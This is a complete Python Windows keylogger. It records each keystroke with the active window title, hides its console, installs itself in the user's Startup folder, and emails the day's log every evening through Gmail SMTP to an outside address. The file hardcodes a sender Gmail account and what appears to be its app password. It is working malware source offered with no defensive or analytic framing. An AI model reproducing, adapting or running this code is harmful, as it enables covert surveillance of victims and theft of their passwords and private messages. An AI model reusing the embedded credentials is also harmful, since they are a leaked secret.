import os
import time
import logging
import smtplib
import ctypes
import win32api
import win32gui
import win32console
import win32com.client
from pynput import keyboard
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Configuration Variables
LOG_DIR = os.path.expanduser("~\\keylogger_logs")
LOG_FILE = os.path.join(LOG_DIR, f"keystrokes_{datetime.now().date()}.txt")
EMAIL_SETTINGS = {
    "sender": "testkeylogger81@gmail.com",  
    "password": "xzzf cyny lucp hobx",       
    "receiver": "edulinkapp@gmail.com",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587
}


if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Logging setup
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(message)s')

def send_email():
    """Sends the daily log file via email."""
    try:
        with open(LOG_FILE, 'r') as file:
            log_content = file.read()

        msg = MIMEMultipart()
        msg['From'] = EMAIL_SETTINGS['sender']
        msg['To'] = EMAIL_SETTINGS['receiver']
        msg['Subject'] = f"Keylogger Logs for {datetime.now().date()}"
        msg.attach(MIMEText(log_content, 'plain'))

        with smtplib.SMTP(EMAIL_SETTINGS['smtp_server'], EMAIL_SETTINGS['smtp_port']) as server:
            server.starttls()  # Start encrypted connection
            server.login(EMAIL_SETTINGS['sender'], EMAIL_SETTINGS['password'])
            server.send_message(msg)

        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def get_active_window():
    """Returns the title of the currently active window."""
    hwnd = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(hwnd)
    return window_title

def log_key(key):
    """Logs the keystrokes with the active window title and timestamp."""
    try:
        current_window = get_active_window()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        if hasattr(key, 'char') and key.char is not None:
            key_data = key.char
        else:
            key_data = f"[{key.name}]"

        log_entry = f"{timestamp} | {current_window} | {key_data}\n"
        logging.info(log_entry)
    except Exception as e:
        print(f"Error logging key: {e}")

def on_press(key):
    """Handles key press events."""
    log_key(key)

def setup_startup():
    """Sets up the script to run at startup."""
    script_path = os.path.realpath(__file__)
    startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    shortcut_path = os.path.join(startup_path, "keylogger.lnk")
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = script_path
    shortcut.save()

def main():
    # Hide the console window
    ctypes.windll.user32.ShowWindow(win32console.GetConsoleWindow(), 0)

    # Set up startup
    setup_startup()

    # Start keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        print("Keylogger started. Capturing keystrokes...")
        while True:
            now = datetime.now()
            # Target time to send email (22:00)
            target_time = now.replace(hour=22, minute=00, second=0, microsecond=0)

            # If it's past the target time, schedule it for the next day
            if now >= target_time:
                target_time += timedelta(days=1)

            # Calculate the sleep time in seconds
            sleep_duration = (target_time - now).total_seconds()
            print(f"Sleeping for {sleep_duration} seconds until 22:00...")
            time.sleep(sleep_duration)

            # Send the email at 22:00
            send_email()

if __name__ == "__main__":
    main()
